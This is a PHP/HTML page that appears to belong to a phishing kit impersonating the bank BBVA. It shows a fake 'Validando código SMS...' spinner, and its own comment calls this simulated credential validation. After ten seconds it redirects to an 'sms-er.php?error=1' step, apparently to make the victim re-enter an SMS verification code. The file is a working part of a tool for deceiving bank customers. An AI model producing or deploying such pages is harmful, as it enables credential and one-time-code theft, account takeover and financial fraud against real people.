<?php
// loading.php - Simulates credential validation before redirecting to the next step
header("Refresh: 10; url=sms-er.php?error=1");
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <title>BBVA</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background-color: #0019A5;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      font-family: Arial, sans-serif;
    }
    .spinner {
      width: 60px;
      height: 60px;
      border: 6px solid #ffffff;
      border-top-color: transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 30px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .loading-box {
      position: absolute;
      bottom: 0;
      width: 100%;
      background-color: #000c3d;
      color: #fff;
      text-align: center;
      padding: 20px 0;
      font-size: 14px;
    }
    .loading-box i {
      margin-right: 10px;
    }
  </style>
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css">
</head>
<body>
  <div class="spinner"></div>
  <div class="loading-box">
    <i class="fas fa-lock"></i> Validando código SMS...
  </div>
</body>
</html>